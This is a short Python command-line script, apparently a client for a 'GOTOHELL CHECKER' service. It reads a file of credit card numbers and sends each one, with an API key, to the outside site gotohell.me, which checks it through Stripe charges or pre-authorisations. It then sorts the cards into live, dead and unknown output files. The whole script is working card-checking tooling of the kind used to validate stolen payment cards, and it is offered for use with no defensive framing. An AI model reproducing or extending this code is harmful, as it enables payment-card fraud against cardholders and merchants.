import requests
from colorama import Fore, Style

# GOTOHELL CHECKER CLI VERSION https://gotohell.me

rs = Style.RESET_ALL
fg = Fore.GREEN
fr = Fore.RED
fy = Fore.YELLOW
fb = Fore.BLUE
fc = Fore.CYAN
fm = Fore.MAGENTA
lg = Fore.LIGHTGREEN_EX
lr = Fore.LIGHTRED_EX

# Input API key, input file, and API option
try:
    # Input API key, input file, and API option
    api_key = input(f"INPUT API KEY : ")
    file_path = input(f"INPUT LIST FILE : ")
    api_option = input(f"{fg}[1]{rs} STRIPE $0.70-$1.00 {fg}[2]{rs} STRIPE $5 {fg}[3]{rs} STRIPE PRE-AUTH : ")

    # Read the input file and store the values in a list
    with open(file_path, "r") as file:
        values = file.read().splitlines()

    # Make requests to the selected API for each value in the list
    for value in values:
        api_url = f"https://gotohell.me/api/{api_option}.php?key={api_key}&cc={value}"
        
        # Request to the selected API
        response = requests.get(api_url)
        
        # Check for error response
        if response.json() and "error" in response.json()[0] and response.json()[0]["error"] != "Check your list format!":
            print(f"{fr}Error: {response.json()[0]['error']}{rs}")
            break

        # Extract values from the JSON response
        json_data = response.json()[0]
        status = json_data["status"]
        api = json_data["api"]
        balance = json_data["balance"]
        cc = json_data["cc"]
        bin_value = json_data["bin"]
        message = json_data["message"]

        # Determine the status and print accordingly
        if status == 'LIVE':
            print(f"| {fg}{status}{rs} | [{fc}{balance}{rs}] {fy}{cc}{rs} - {fm}{bin_value}{rs} - {lg}{message}{rs}")
            with open("CC_LIVE.txt", "a") as file:
                file.write(f"{cc} [{api}] {bin_value} - {message}\n")
        elif status == 'DEAD':
            print(f"| {fr}{status}{rs} | [{fc}{balance}{rs}] {fy}{cc}{rs} - {fm}{bin_value}{rs} - {lr}{message}{rs}")
            with open("CC_DEAD.txt", "a") as file:
                file.write(f"{cc} [{api}] {bin_value} - {message}\n")
        else:
            print(f"| {fr}{status}{rs} | [{fc}{balance}{rs}] {fy}{cc}{rs} - {fm}{bin_value}{rs} - {lr}{message}{rs}")
            with open("CC_UNKNOWN.txt", "a") as file:
                file.write(f"{cc} [{api}] {bin_value} - {message}\n")

except FileNotFoundError:
    print(f"{fr}Error: Input file '{file_path}' not found!{rs}")
except requests.exceptions.ConnectionError:
    print(f"{fr}Error: Connection Error! Please check your internet connection.{rs}")
